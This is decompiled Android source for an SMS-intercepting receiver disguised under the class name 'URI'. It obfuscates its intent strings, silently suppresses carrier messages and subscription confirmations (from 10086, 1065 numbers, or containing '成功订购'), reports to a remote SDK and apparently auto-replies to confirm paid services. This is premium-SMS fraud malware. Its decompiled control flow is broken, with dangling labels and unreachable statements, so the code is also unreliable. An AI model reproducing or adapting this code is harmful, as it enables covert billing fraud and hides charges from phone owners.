package cn.mono.gink;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import org.json.JSONException;
import org.json.JSONObject;

public class URI
  extends BroadcastReceiver
{
  private String TAG = "URI";
  protected MyLogger logger = MyLogger.getLogger();
  
  public URI() {}
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    paramContext = paramIntent.getAction();
    this.logger.e(this.TAG, paramContext);
    paramContext = new StringBuffer(56);
    paramContext.append("SM");
    paramContext.append("S_RECEI");
    paramContext.append("VED");
    Object localObject1 = new StringBuffer(56);
    ((StringBuffer)localObject1).append("WA");
    ((StringBuffer)localObject1).append("P_PUS");
    ((StringBuffer)localObject1).append("H_REC");
    ((StringBuffer)localObject1).append("EIVED");
    int i;
    label212:
    String str5;
    label671:
    int j;
    if (paramIntent.getAction().contains(paramContext.toString()))
    {
      paramContext = paramIntent.getExtras();
      if (paramContext == null) {
        return;
      }
      paramIntent = (Object[])paramContext.get("pdus");
      paramContext = new byte[paramIntent.length][];
      i = 0;
      while (i < paramContext.length)
      {
        paramContext[i] = ((byte[])(byte[])paramIntent[i]);
        i += 1;
      }
      paramIntent = new byte[paramContext.length][];
      SmsMessage[] arrayOfSmsMessage = new SmsMessage[paramIntent.length];
      i = 0;
      while (i < paramIntent.length)
      {
        paramIntent[i] = paramContext[i];
        arrayOfSmsMessage[i] = SmsMessage.createFromPdu(paramIntent[i]);
        i += 1;
      }
      int k = arrayOfSmsMessage.length;
      i = 0;
      if (i < k)
      {
        paramContext = arrayOfSmsMessage[i];
        str5 = paramContext.getDisplayOriginatingAddress();
        String str6 = paramContext.getDisplayMessageBody();
        this.logger.e(this.TAG, str5);
        this.logger.e(this.TAG, str6);
        Object localObject2 = null;
        localObject1 = null;
        paramIntent = null;
        paramContext = null;
        try
        {
          JSONObject localJSONObject = PluginSdk.ddjjobject;
          Object localObject3 = null;
          String str4 = null;
          localObject2 = null;
          String str3 = null;
          paramContext = null;
          String str1 = null;
          localObject1 = null;
          String str2 = null;
          paramIntent = null;
          if (localJSONObject != null)
          {
            paramContext = str3;
            paramIntent = str2;
            localObject1 = str1;
            localObject2 = str4;
            localObject3 = PluginSdk.ddjjobject.getString("ad");
            paramContext = str3;
            paramIntent = str2;
            localObject1 = str1;
            localObject2 = localObject3;
            str1 = PluginSdk.ddjjobject.getString("dd");
            paramContext = str3;
            paramIntent = str2;
            localObject1 = str1;
            localObject2 = localObject3;
            str2 = PluginSdk.ddjjobject.getString("pd");
            paramContext = str3;
            paramIntent = str2;
            localObject1 = str1;
            localObject2 = localObject3;
            str3 = PluginSdk.ddjjobject.getString("cd");
            paramContext = str3;
            paramIntent = str2;
            localObject1 = str1;
            localObject2 = localObject3;
            str4 = PluginSdk.ddjjobject.getString("pn");
            localObject2 = localObject3;
            localObject1 = str1;
            paramIntent = str2;
            paramContext = str3;
            localObject3 = str4;
          }
        }
        catch (JSONException localJSONException)
        {
          CharSequence localCharSequence;
          for (;;)
          {
            localJSONException.printStackTrace();
            localCharSequence = null;
          }
          if ((!str5.contains("10086")) && (!str6.contains("成功订购")) && (!str6.contains("和视频")) && (!str6.contains("和视界")) && (!str6.contains(localCharSequence)) && (!str5.contains("1065")) && (!str5.contains("1066")) && (!str5.contains("118010")) && (!str5.contains("10001888"))) {
            break label671;
          }
          this.logger.e(this.TAG, str5 + str6);
          abortBroadcast();
          return;
          if (paramContext.length() <= 0) {
            break label723;
          }
        }
        if ((paramIntent != null) && (paramIntent.length() > 0) && (str6.contains(localObject2)))
        {
          abortBroadcast();
          this.logger.e(this.TAG, str5 + paramIntent);
          PluginSdk.dosubmit_B("31", "DD_" + (String)localObject1);
          PluginSdk.SayTest(str5, paramIntent, 1);
          return;
        }
        paramContext = paramContext.split(";");
        j = 0;
        label688:
        if (j >= paramContext.length) {
          break label772;
        }
        if (!str6.contains(paramContext[j])) {
          break label743;
        }
      }
    }
    label723:
    label743:
    label772:
    for (paramContext = Boolean.valueOf(true);; paramContext = Boolean.valueOf(false))
    {
      if (paramContext.booleanValue()) {
        abortBroadcast();
      }
      this.logger.e(this.TAG, str5);
      i += 1;
      break label212;
      break;
      j += 1;
      break label688;
      if (!paramIntent.getAction().contains(((StringBuffer)localObject1).toString())) {
        break;
      }
      abortBroadcast();
      return;
    }
  }
}
